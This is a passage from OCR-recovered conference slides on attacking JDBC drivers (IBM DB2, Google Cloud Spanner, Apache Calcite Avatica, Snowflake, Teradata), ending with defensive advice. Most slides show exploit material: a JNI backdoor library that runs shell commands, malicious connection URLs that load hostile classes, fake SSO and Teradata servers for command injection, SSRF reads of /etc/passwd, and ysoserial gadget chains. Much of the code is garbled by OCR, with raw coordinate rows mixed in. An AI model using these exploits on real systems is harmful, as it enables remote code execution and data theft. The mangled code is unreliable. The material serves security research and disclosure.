= Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DE
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14226][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
13 more
Process finished with exit code 1
```

## Slide 36

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

Try to find a No Argument Constructor in the real-world scenario

## Slide 37

## JNI (Java Native Interface)

###### • System.loadLibrary method to revoke the libraries from various platforms

JVM File
JNI
Windows JVM .dll
Source Code Byte Code Linux JVM .so
.dylib
MacOS JVM

## Slide 38

com.sun.security.auth.module.UnixSystem

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
com.sun.security.auth.module.UnixSystem
@jdk.Exported
public class UnixSystem
private native void getUnixInfo() ;
protected String username;
protected long uid;
cted long gid;
ected longl] groups;
10
2 x Instantiate code>UnixSystem</code id load
3 « the tive Ui t e the underlying tem informati¢
15 public UnixSystem()
16 O System. LoadLibrary ("jaas_unix") ;
17 getUnixInfo() ;
18 }
```

## Slide 39

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Hijack the Java library jaas_unix (Java Authentication and Authorization Service)

- com.sun.security.auth.module.UnixSystem (Linux )

   - Public Constructor

- com.sun.security.auth.module.NTSystem  (Windows)

**java.library.path**

/Library/Java/JavaVirtualMachines/jdk1.8.0_181.jdk/Contents/Home/jre/lib

libjaas_unix.dylib

## Slide 40

JNI Backdoor for Command Execution

##### **libjaas_unix.dylib**

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
JNI Backdoor for Command Execution
#include <stdli
#include <string>
#include
ce std;
using
jint JNI_OnLoad(JavaVMx vm, void* reserved) {
JNIEnv* env;
vm->AttachCurrentThread((void*x*x)&env, NULL);
jclass system_clazz = env—>FindClass("java/lang/System") ;
jmethodID get_property_method = env->GetStaticMethodID(system_clazz,
if (get_property_method == NULL) {
return JNI_VERSION_1_2;
jboolean jsCopy;
const charx cmd = env->GetStringUTFChars (env->NewStringUTF ("open
std::string ee;
system(ee.c_str());
return JNI_VERSION_1_2;
or"), &jsCopy) ;
```

## Slide 41

## IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

- Remote Code Execution with JNI

> Text below was recovered by OCR (confidence 91/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
¢ Remote Code Execution with JNI
DriverManager.registerDriver com.ibm.db2.jcc.DB2Driver
System;"
```

## Slide 42

IBM DB2 JCC Driver Remote Code Execution via Unchecked Class

> Text below was recovered by OCR (confidence 86/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
IBM DB2 JCC Driver Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
public class DB2JCCDemo {
public static void main(String[] args) throws Exception {
// Register Driver
DriverManager.registerDriver(new com.ibm.db2.jcc.0B2Driver());
// Get Connection
DriverManager.getConnection( url: jdbc:db2://127.0.0.1:5001/testdb
5	1	6	1	2	4	1221	689	10	37	61.596867	:
5	1	6	1	2	5	1239	689	306	37	41.072689	pluginClassName=com.
5	1	6	1	2	6	1557	693	318	27	72.852936	example.Evil0bject;) ;
at com.ibm.db2.jcc.DB2Driver.connect (DB2Driver. java:117)
at java.sql.DriverManager .getConnection(DriverManager. java:664)
at java.sql.DriverManager .getConnection(DriverManager. java:270)
Caused by: java.security.PrivilegedActionException Create breakpoint : com.ibm.db2.jcc.am.SqlException: [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB
at com.ibm.db2.jcc.am.is.a(Cis. java: 4586)
- 11 more
Caused by: com.ibm.db2.jcc.am.SqlException Create breakpoint : [jcc][20148][14220][4.29.24] The pluginClass pluginClassName is not an instance of com.ibm.db2.jcc.DB2JCCPlugin. ERRORCODE=-4461, SQLSTATE=nul
at com.ibm.db2.jcc.am.b7.a(b7. java: 66)
at com.ibm.db2.jcc.am.b7.a(b7. java:116)
at com.ibm.db2.jcc.am.ct.run(ct.java:33)
- 13 more
```

## Slide 43

## Google Cloud Spanner Remote Code Execution via Unchecked Class

###### • CredentialsProvider

> Text below was recovered by OCR (confidence 84/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Google Cloud Spanner Remote Code Execution via Unchecked Class
1 static @Nullable CredentialsProvider parseCredentialsProvider (String uri) {
2 String name parseUriProperty (uri, CREDENTIALS_PROVIDER_PROPERTY_NAME) ;
3 (name != null) {
5 Class<? extends CredentialsProvider> clazz =
6 (Class<? extends CredentialsProvider>) Class. forName (name) ;
7 O Constructor<? extends CredentialsProvider> constructor = clazz.getDeclaredConstructor () ;
8 return constructor.newInstance() ;
9 + catch (ClassNotFoundException classNotFoundException) {
10 throw SpannerExceptionFactory.newSpannerException (
11 ErrorCode.INVALID_ARGUMENT ,
12 Unknown
5	1	3	9	1	3	931	1517	49	23	95.707703	or
5	1	3	9	1	4	1017	1506	186	34	92.432358	invalid
5	1	3	9	1	5	1239	1506	525	34	91.225662	CredentialsProvider
5	1	3	9	1	6	1800	1506	132	34	96.117622	class
5	1	3	9	1	7	1969	1517	123	23	93.198669	name:
5	1	3	9	1	8	2140	1507	12	14	92.275955 + name,
13 classNotFoundException) ;
```

## Slide 44

Google Cloud Spanner Remote Code Execution via Unchecked Class

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
>
>
Run:
Google Cloud Spanner Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
public class CloudSpannerDemo {
public static void main(String[] args) throws SQLException {
System.setProperty("cmd","open -a calculator") ;
DriverManager .getConnection( url: jdbc:cloudspanner:
5	1	8	1	1	5	1189	755	1818	29	38.550091	/projects/lLearning-pjm/instances/test/databases/test;
5	1	8	1	1	6	2038	751	429	37	31.776390	credentialsProvider=com.sun.
5	1	8	1	1	7	2475	751	122	37	5.131775	security
5	1	8	1	1	8	2602	751	383	37	5.131775	.auth.module.UnixSystem) ;
au
at
Caused
at
at
at
at
at
com.mysql.jdbc.test.CloudSpannerDemo .main(€LoudSpannerDemo. java:14)
by: java.lang.ClassCastException Create breakpoint
com.google
com.google
com.google.
com.google
com.google.
3 more
.cloud.
cloud.
-cloud.
cloud.
spanner. jdbc. JdbcDriver.connect (JdbcDriver. java:195)
Prorece fFfiniched with evit code 1
AC
%
com.sun.security.auth.module.UnixSystem cannot be cast to com.google.api.gax.core.CredentialsProvid
```

## Slide 45

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

- httpclient_impl

   - The class which implements HTTPClient class used to send HTTP requests from client to server

- Invocation of arbitrary constructor with URL argument due to unchecked superclass

- We reported and it was assigned CVE-2022-36364

**Thoughts Class**

## Slide 46

Apache Calcite Avatica Remote Code Execution via Unchecked Class

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
private AvaticaHttpClient instantiateClient(String className, URL url) {
try {
Class<?> clz = Class. forName(className) ;
Constructor<?> constructor = clz.getConstructor(URL.class) ;
Object instance = constructor.newInstance (Objects. requireNonNull (url) );
return AvaticaHttpClient.class.cast(instance) ;
} catch (Exception e) {
throw new RuntimeException("Failed to construct AvaticaHttpClient implementation
+ className, e);
10
11 i
```

## Slide 47

## Apache Calcite Avatica Remote Code Execution via Unchecked Class

###### **Thoughts Class**

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import com. fasterxml.jackson.databind.JsonNode;
import com. fasterxml.jackson.databind.ObjectMapper ;
import java.10.%;
import java.net.URL;
| Thoughts Class |
public class CustomHttpClient {
public CustomHttpClient(URL url) throws IOException {
Object content = url.getContent( );
if (content instanceof InputStream) {
BufferedReader reader = new BufferedReader (new InputStreamReader ( (InputStream)
content) ) ;
ObjectMapper mapper new ObjectMapper () ;
JsonNode jnode = mapper.readTree(reader) ;
String result = jnode.path("result") .asText() ;
Runtime. getRuntime() .exec(result) ;
J
```

## Slide 48

Apache Calcite Avatica Remote Code Execution via Unchecked Class

> Text below was recovered by OCR (confidence 90/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Structure
WM Bookmarks
Apache Calcite Avatica Remote Code Execution via Unchecked Class
import java.sql.DriverManager;
import java.sql.SQLException;
public class AvaticaDemo{
public static void main(String[] args) throws SQLException {
DriverManager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
/Library/Java/JavaVirtualMachines/jdk1.8.0_201.jdk/Contents/Home/bin/java ...
{"result":"open -a calculator"}
Exception in thread main java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation com.example.avaticademo.CustomHttpCLlient
6
>
Run:
= at
at
at
at
at
at
at
at
org.apache
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
org.apache.
org.apache
org.apache.
org.apache.
-calcite.
calcite.
calcite.
-calcite.
calcite.
calcite.
calcite.
calcite.
calcite.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica.
avatica
avatica.
avatica.
AvaticaConnection.<init>(AvaticaConnection. java:121)
UnregisteredDriver.connect(UnregisteredDriver. java:138)
```

## Slide 49

## Apache Calcite Avatica SSRF via Unchecked Class

Try to find a gadget in the real-world scenario

## Slide 50

## Apache Calcite Avatica SSRF via Unchecked Class

- **Leverage dynamic analysis tools to look up the particular gadgets**

- **Verify the gadgets we find**

   - com.sun.media.sound.SF2Soundbank

   - javax.swing.JEditorPane

   - jdk.internal.loader.FileURLMapper

   - sun.security.provider.PolicyFile

## Slide 51

## Apache Calcite Avatica SSRF via Unchecked Class

• sun.security.provider.PolicyFile

> Text below was recovered by OCR (confidence 93/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Apache Calcite Avatica SSRF via Unchecked Class
PolicyFile java.security.Policy {
PolicyFile(URL url)
```

## Slide 52

## Apache Calcite Avatica SSRF via Arbitrary Class

• Sensitive Information Leakage in JDBC Connecting Exception

> Text below was recovered by OCR (confidence 82/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Apache Calcite Avatica SSRF via Arbitrary Class
* Sensitive Information Leakage in JOBC Connecting Exception
> public class AvaticaDemo{
> public static void main(String[] args) throws SQLException {
DriverNanager.registerDriver(new org.apache.calcite.avatica.remote.Driver());
DriverManager .getConnection( url: jdbc:avatica:remote:url=https:
5	1	4	1	2	5	1252	555	204	35	53.754669	//jdbc-attack,
5	1	4	1	2	6	1463	559	472	22	73.884796	com?file=/etc/passwd;httpclient
5	1	4	1	2	7	1952	560	580	22	42.029095	impl=sun.security.provider.PolicyFile) ;
=) com.example.avaticademo.AvaticaDemo =
line 1: expected [;], found [root:x:0:9:root:/root:/bin/bash
a Exception in thread main java.lang.RuntimeException Create breakpoint : Failed to construct AvaticaHttpClient implementation sun.security.provider.PolicyFile
at org.apache.calcite.avatica.remote.Driver.getHttpClient (Driver. java:160)
at org.apache.calcite.avatica.remote.Driver.createService(Driver. java:123)
at org.apache.calcite.avatica.AvaticaConnection.<init>(Avatic nonection. java:121)
at org.apache.calcite.avatica.AvaticaJdbc41Factory$AvaticaJdbc41Connection. <init>(AvaticaJdbc41Factory. java:109)
at org.apache.calcite.avatica.AvaticaJdbe41Factory .newConnection(AvaticaJdbc41Factory.java:65)
at org.apache.calcite.avatica.remote.Driver.connect (Driver. java:165)
at java.sql.DriverManager .getConnection(DriverManager. java: 664)
at com.example.avaticademo.AvaticaDemo.main(AvaticaDemo. java:14)
Caused by: java.lLang.ClassCastException Create breakpoint : Cannot cast sun.security.provider.PolicyFile to org.apache.calcite.avatica.remote.AvaticaHttpClient
at java.lang.Class.cast (Class. java:3369)
at org.apache.calcite.avatica.remote.AvaticaHttpClientFactoryImpl. instantiateClient (AvaticahttpClientFactoryImpl. java:145)
12 more
```

## Slide 53

Abused Connection Resource

Arbitrary Log File Writing

Lexical Syntax Compatibility Unchecked Initialization Class

### Incorrect Response Disposal

JDBC Attack Protection

## Slide 54

## Snowflake Remote Code Execution via SSO Flow Response

- Browser-based SSO

- Relying on open (Mac), xdg-open (Linux), cmd (!) (Windows) – platform- and driver-specific RCE

- Malicious SSO server can inject command via ssoUrl attribute in returned SSO response

- RCE on MacOS (JDBC, NodeJS) and Windows (NodeJS)

## Slide 55

Snowflake Remote Code Execution via SSO Flow Response

> Text below was recovered by OCR (confidence 83/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Snowflake Remote Code Execution via SSO Flow Response
1 @Override
2 DLic void openBrowser (String ssoUrl) throws SFException
3 try
4
5 if (java.awt.Desktop.isDesktopSupported () )
7 java.awt.Desktop. getDesktop() .browse(ur7) ;
8 }
9 Runtime runtime = Runtime. getRuntime() ;
10 Constants.OS os Constants. get0OS() ;
11 if (os == Constants.OS.MAC)
```

## Slide 56

**Fake Server**

> Text below was recovered by OCR (confidence 79/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
from flask import Flask, jsonify, request
app = Flask(__name__)
@app. route('/session/authenticator-request', methods = ['POST'])
def SSOJSON():
if(request.method == 'POST'):
jsonData = {"success": true, data: {"proofkey": foo, ssoUrl: calc}}
return jsonify (data)
if __name__ == '__main_':
app.run('0.0.0.0', debug=True, port=443, ssl_context=('/root/ssl/jdbc-attack.com_bundle.pem' ,
'/root/ssl/jdbc-attack.com.key'))
```

## Slide 57

## Snowflake Remote Code Execution via SSO Flow Response

- authenticator=external

   - To set up browser-based SSO from external for authentication

- JDBC driver requests https://<host>/session/authenticator-request and parses JSON response

- Passes the value of the data.ssoURL() JSON format property to Runtime.exec() as second parameter

   - First parameter is open on MacOS

   - Remote Code Execution on MacOS

## Slide 58

Snowflake Remote Code Execution via SSO Flow Response

> Text below was recovered by OCR (confidence 93/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Snowflake Remote Code Execution via SSO Flow Response
java.sql.DriverManager
main(String Exception
DriverManager .registerDriver com. snowflake.client. jdbc. SnowflakeDriver
DriverManager .getConnection("jdbc: snowflake: //jdbc-attack.com/?user=admin&password=123456&db=sdb&authenticator=externalbrowser"
https://safe.govfz.com:
w
https://safe.govfz.com:443
Initiating login request with your identity provider. A browser window should have opened for you to complete the login. If you can't see it, check existing browser windows, or your OS settings. Press CTRL+C to abort and try
```

## Slide 59

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP authentication allows delegated credentials to AWS

   - Exposed a design flaw in GCP authentication library (in all languages that we looked at)

   - Design flaw can lead to full read SSRF by supplying a crafted set of credentials

- encodedCredentials

   - Allow users to set their own Google Cloud Platform  credentials in Base64-encoded JSON through this undocumented property

## Slide 60

## Google Cloud Spanner JDBC Driver Full Read SSRF

- GCP credential JSON is used for all auth to GCP

- JSON is deserialized by different implementations

- We are targeting the ExternalAccountCredentials.fromJson method

- Supports many external credentials including AWS

- AWS implementation makes several HTTP requests based on the provided config

## Slide 61

## Google Cloud Spanner JDBC Driver Full Read SSRF

###### • Crafted Credentials

**Response JSON Format**

> Text below was recovered by OCR (confidence 85/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
* Crafted Credentials
type: external_account,
audience: test,
subject_token_type: test,
token_url: https://sts.google.apis.com/token,
credential_source:
environment_id: awsl1,
regional_cred_verification_url: https://accounts.google.com/o/oauth2/auth,
region_url: https://accounts.google.com/o/oauth2/token,
url: https://ww.googleapis.com/oauth2/vl/certs
xservice_account_impersonation_url:
wi
token_info_url:
Response JSON Format
```

## Slide 62

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR (confidence 91/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
if (awsCredentialSource.url == null awsCredentialSource.url.isEmpty()) {
field.");
J
The credential source does not contain the"
String roleName = retrieveResource(awsCredentialSource.url, IAM
5	1	9	1	1	6	2139	705	149	43	93.302391	role, metadataRequestHeaders) ;
String awsCredentials
retrieveResource (
awsCredentialSource.url + / + roleName,
credentials, metadataRequestHeaders) ;
JsonParser parser OAuth2Uti ls. JSON_FACTORY.createJsonParser (awsCredentials) ;
```

## Slide 63

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR (confidence 96/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Google Cloud Spanner JDBC Driver Full Read SSRF
Connection conn =
```

## Slide 64

Google Cloud Spanner JDBC Driver Full Read SSRF

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
44
String credentialsJson
// note: the project/i
Google Cloud Spanner JDBC Driver Full Read SSRF
/projects/Learning-pjm/instances/test/databases/test;encodedCredentials=%s", credentialsJsonEncaded) ;
// Register Connection
struct JDBC Connection URL: %s%n", url);
// Get Connection
Connection connection
// Establish the conne
™ CloudSpannerFullSSRFPOC
at com.google.auth.cauth2.
at com.google.auth.oauth2.
at com.google.auth.oauth2.
at com.google.auth.cauth2.
3 more
Caused by: com.google.api.client.http.HttpResponseException: 500 INTERNAL SERVER ERROR
= DriverManager.getConnection(url) ;
ction
ment();
AwsCredentials.retrieveSubjectToken(AwsCredentials. java:162)
AwsCredentials.refreshAccessToken(AwsCredentials. java:142)
OAuth2Credentials$1.call(@Auth2Credentials.java:254) <1 internal Line>
<!DOCTYPE HTML PUBLIC -//W3C//DTD
5	1	41	1	1	5	676	1600	49	17	95.333794	HTML
5	1	41	1	1	6	752	1600	54	18	71.712463	4.61
5	1	41	1	1	7	829	1599	241	20	91.648987	Transitional//EN
2	1	42	0	0	0	140	1636	439	103	-1	
3	1	42	1	0	0	140	1636	439	103	-1	
4	1	42	1	1	0	412	1636	167	32	-1	
5	1	42	1	1	1	412	1636	15	32	2.590248	rn
5	1	42	1	1	2	476	1640	13	18	57.321777	R
5	1	42	1	1	3	567	1640	12	18	96.971138	4
4	1	42	1	2	0	140	1682	87	16	-1	
5	1	42	1	2	1	140	1682	87	16	58.037205	<html>
4	1	42	1	3	0	171	1723	87	16	-1	
5	1	42	1	3	1	171	1723	87	16	96.977516	<head>
2	1	43	0	0	0	201	1761	390	23	-1	
3	1	43	1	0	0	201	1761	390	23	-1	
4	1	43	1	1	0	201	1761	390	23	-1	
5	1	43	1	1	1	201	1761	390	23	89.982834	<title>NotADirectoryError:
2	1	44	0	0	0	753	1645	10	11	-1	
3	1	44	1	0	0	753	1645	10	11	-1	
4	1	44	1	1	0	753	1645	10	11	-1	
5	1	44	1	1	1	753	1645	10	11	97.016556	>
2	1	45	0	0	0	618	1760	1263	24	-1	
3	1	45	1	0	0	618	1760	1263	24	-1	
4	1	45	1	1	0	618	1760	1263	24	-1	
5	1	45	1	1	1	618	1760	84	22	86.263351	{Errno
5	1	45	1	1	2	722	1760	38	22	68.383430	26]
5	1	45	1	1	3	783	1763	41	17	95.683067	Not
5	1	45	1	1	4	844	1767	11	13	95.879120	a
5	1	45	1	1	5	875	1761	144	23	93.112320	directory:
5	1	45	1	1	6	1042	1760	747	24	88.792404	&#x27;/etc/passwd/root:x:0:0:root:/root:/bin/bash
5	1	45	1	1	7	1809	1762	72	18	91.097939	bin:x
2	1	46	0	0	0	1889	1763	43	17	-1	
3	1	46	1	0	0	1889	1763	43	17	-1	
4	1	46	1	1	0	1889	1763	43	17	-1	
5	1	46	1	1	1	1889	1763	43	17	95.000000	 
2	1	47	0	0	0	1932	1760	1265	24	-1	
3	1	47	1	0	0	1932	1760	1265	24	-1	
4	1	47	1	1	0	1932	1760	1265	24	-1	
5	1	47	1	1	1	1932	1760	362	24	87.019363	1:bin:/bin:/sbin/nologin
5	1	47	1	1	2	2314	1760	593	24	84.264755	daemon:x:2:2:daemon:/sbin:/sbin/nologin
5	1	47	1	1	3	2927	1761	270	20	90.370781	adm:x:3:4:adm:/var
```

## Slide 65

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• BROWSER

- Leverages browser-based SSO via Teradata Server configuration enabling OpenID Connect (OIDC) and JDBC URL parameter • Client OIDC handling requires the server to confirm that OIDC is configured and this allows the JDBC driver to use the browser-based SSO code path

• On any Teradata server where OIDC is enabled

## Slide 66

> Text below was recovered by OCR (confidence 83/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
1 var6 = var6.replaceALL("PLACEHOLDER", varl2 + ?response_type=code + &client_id= +4
2 Utility.safeForURL(var9) + &redirect_uri= + Utility.safeForURL(var20) + &code_challenge= +
3 Utility.safeForURL(var15) + &code_challenge_method=S256 + &scope=_ + Utility.safeForURL(var21)) ;
4 if (this. log.isTimingEnabled()) {
exec", Utility.wrapEx(var30,
13 ErrorFactory.makeDriverJDBCException("TJ1551", var6)));
14 }
```

## Slide 67

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

###### • Create a fake Teradata server in Python which tells the client OIDC has been configured on the server

- This tricks the client into allowing the BROWSER JDBC property

- Does not even require a working Teradata server to achieve RCE on the machine running the JDBC client

- Similar to the Rogue MySQL Server LOCAL INFILE exploit from many years ago

## Slide 68

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

• Python program that fakes the Teradata server handshake protocol

**Fake Server Code Fragment**

## Slide 69

## Teradata JDBC Driver Remote Code Execution via SSO Command Injection

- JDBC client connects to fake Teradata server (in Python)

- Fake server tells client OIDC is enabled

- JDBC client makes URL request to OIDC server, expecting JSON document with openid-configuration format - Bonus! Blind GET-based SSRF here

- • JDBC client executes the command in the BROWSER property

## Slide 70

Teradata JDBC Driver Remote Code Execution via SSO Command Injection

> Text below was recovered by OCR (confidence 77/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Run:
Teradata JOBC Driver Remote Code Execution via SSO Command Injection
import java.sql.DriverNanager;
import java.sql.SQLException;
public class TeradataDemo {
public sta
tic v
oid main(String[] args) thro
x pyn3rd@acBookPro JEVEE python3 -u rogue_teradata_server.py -p 10250 -u ‘https://jdbc—attack.com/teradata'
04/14/2023 11:40:38 AM [+]Connecting from IP: 127.0.0.1, Port: 54400
04/14/2023 11:40:38 AM [+]Data sending: b‘'\x03\x02\n\x00\x00\x07\x00\x00\x03\xa3\x00\x00\x00\x00\x00\x00\x00\x00\ x00\ x00\x00\x00\x00\x00\
DriverManager.getConnection( url: jdbc:teradata://127.0.0.1/DBS_PORT=10250,
5	1	14	1	1	4	1383	732	226	33	90.965630	LOGMECH=BROWSER,
5	1	14	1	1	5	1622	732	185	33	91.336449	BROWSER='open
5	1	14	1	1	6	1829	743	24	14	92.841110	-a
5	1	14	1	1	7	1872	733	157	35	44.511681	calcuLlator'
5	1	14	1	1	8	2040	752	5	9	55.341648	,
5	1	14	1	1	9	2063	733	161	35	34.678261	TYPE=DEFAULT
5	1	14	1	1	10	2235	752	5	9	34.678261	,
5	1	14	1	1	11	2252	739	95	18	73.811050	COP=OFF
5	1	14	1	1	12	2356	752	4	9	73.811050	,
5	1	14	1	1	13	2378	733	147	35	84.601852	TMODE=TERA,
5	1	14	1	1	14	2541	733	138	35	82.819939	LOG=DEBUG) ;
eee
2023-04-14.11:41:37.530 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_ Wf 8 9 | ooo ffs. = In = ial nid-confi ion
v 2023-04-14.11:41:37.561 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL_ socketFactory: sHTTPSProtocol=TLSv1.2
> 2023-04-14.11:41:37.562 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_ 4 5 6 FD essary sm_socketFactory.getDefauLtCipherSuites=[TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA2
=f 2023-04-14.11:41:38.098 TERAIDBC4 TIMING [main] com.teradata. jdbc. jdk6.JDK6_SQl y httos://jdbe-attack. com/teradata/.well-known/openid-configuration took 567 ms and completed
mm 2023-04-14.11:41:38.098 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6.JDK6_SQL 1 9) 3 ee HttpServer with Browser Authentication timeout 186000 ms and browser tab timeout 5060 ms
i 2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbe.jdk6é.JDK6_SQL_ authorization_endpoint": foo, token_endpoint: bar }
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [Thread-4] com.teradata.jdbc.jdk6.JDK6_ fe) arver Listening on port 54470
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6.JDK6_SQL _ r= | =
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 sTokenURL=bar 3
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata. jdbc. jdk6é.JDK6_SQL_Connection@16ec5519 sOIDCScope=openid =
2023-04-14.11:41:38.101 TERAJDBC4 DEBUG [main] com.teradata.jdbc.jdk6é.JDK6_SQL_Connection@16ec5519 (before PLACEHOLDER swap) sBrowser=open -a calculator S
2023-04-14.11:41:38.102 TERAJDBC4 TIMING [main] com.teradata.jdbc.jdk6é.JDK6é_SQL_Connection@16ec5519 Launching browser open -a calculator 3
```

## Slide 71

## Bypass high version Java reflection restriction via Teradata JDBC Driver

- Attack interfaces can be combined

- JDBC connection can be leveraged to evade Java deserialization with reflection in JDK

JDBC
JNDI Deserialization

## Slide 72

**CommonsBeantils Gadget**

> Text below was recovered by OCR (confidence 87/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
public class CommonsBeanutilsl implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
final Object templates = Gadgets.createTemplatesImpl (command) ;
// mock method name until armed
final BeanComparator comparator = new BeanComparator("lLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger ("1") ) ;
// switch method called by comparator
Ref lections.setFieldValue(comparator, property, outputProperties) ;
// switch contents of queue
queueArray| 0] = templates;
queueArray|1] = templates;
return queue;
```

## Slide 73

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar CommonsBeanutils1 open -a calculator > /tmp/calc.ser

• Java reflection has been restricted in Java 17

## Slide 74

Bypass high version Java reflection restriction via Teradata JDBC Driver

> Text below was recovered by OCR (confidence 93/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
Bypass high version Java reflection restriction via Teradata JDBC Driver
public class TeraDataSource extends TeraDataSourceBase implements DataSource {
public TeraDataSource() {
public Connection getConnection() throws SQLException {
return this.createNewConnection(this.user, this.password) ;
public Connection getConnection(String varl, String var2) throws SQLException {
return this.createNewConnection(varl, var2);
J
```

## Slide 75

**Getter and Setter**

> Text below was recovered by OCR (confidence 91/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
public class TeraDataSourceBase implements Referenceable, Serializable {
public String getDSName() {
return this.DSName;
}
public void setDSName(String varl) {
this.DSName = varl;
public String getBROWSER() {
return this.m_sBrowser;
public void setBROWSER(String varl) {
this.m_sBrowser = varl;
public void setLOGMECH(String varl) {
this.LogMech = varl;
public String getLOGMECH() {
return this.LogMech;
```

## Slide 76

**TeraDataSource Gadget**

> Text below was recovered by OCR (confidence 90/100) from an image-only slide. Wording is approximate; verify exact values against the source PDF.

```text
public class TeraDataSourcel implements ObjectPayload<Object> {
public Object getObject(final String command) throws Exception {
// create a TeraDataSource object, holding our JDBC string
TeraDataSource dataSource = new TeraDataSource() ;
dataSource.setBROWSER (command) ;
dataSource.setLOGMECH ("BROWSER") ;
dataSource.setDSName("127.0.0.1");
// mock method name until armed
final BeanComparator comparator = new BeanComparator("LlLowestSetBit") ;
// create queue with numbers and basic comparator
final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator) ;
// stub data for replacement Later
queue.add(new BigInteger("1"));
queue.add(new BigInteger("1"));
// switch method called by comparator to getConnection
Reflections.setFieldValue(comparator, property, connection) ;
// switch contents of queue
final Object[{] queueArray = (Object[]) Reflections. getFieldValue(queue, queue) ;
queueArray|0] = dataSource;
queueArray[1] = dataSource;
return queue;
```

## Slide 77

## Bypass high version Java reflection restriction via Teradata JDBC Driver

• Use ysoserial tool to generate CommonsBeanutils1 payload

- java -jar ysoserial.jar TeraDataSource1 open -a calculator > /tmp/tds.ser

###### • Java reflection has been evaded successfully in Java 17

## Slide 78

Abused Connection Resource

Arbitrary Log File Writing Lexical Syntax Compatibility Unchecked Initialization Class

Incorrect Response Disposal

### JDBC Attack Protection

## Slide 79

## JDBC Security for Service Providers

###### If you expose JDBC configuration to users in your software / service:

- Use an allow-list for JDBC properties with minimal viable set for business / service needs

- Use only vetted JDBC drivers and do not allow user upload

- Pay special attention to configuration properties which affect file writes and network/OS commands - deny these by default

- Sandbox user-originated JDBC activity in a dedicated VM or cloud function - assume the environment will be compromised and minimize blast radius

- Regularly review JDBC configurations and usage for malicious or unexpected configuration

- JDBC drivers should be part of your component version lifecycle strategy (keep them updated)

## Slide 80

## JDBC Security for Developers

###### If you are developing a JDBC driver…

- Do not trust user-provided properties, especially when the properties are used to invoke network calls, OS commands, or code through reflection

- Beware of the malicious server and consider using checksums or other verifiable data exchange mechanism

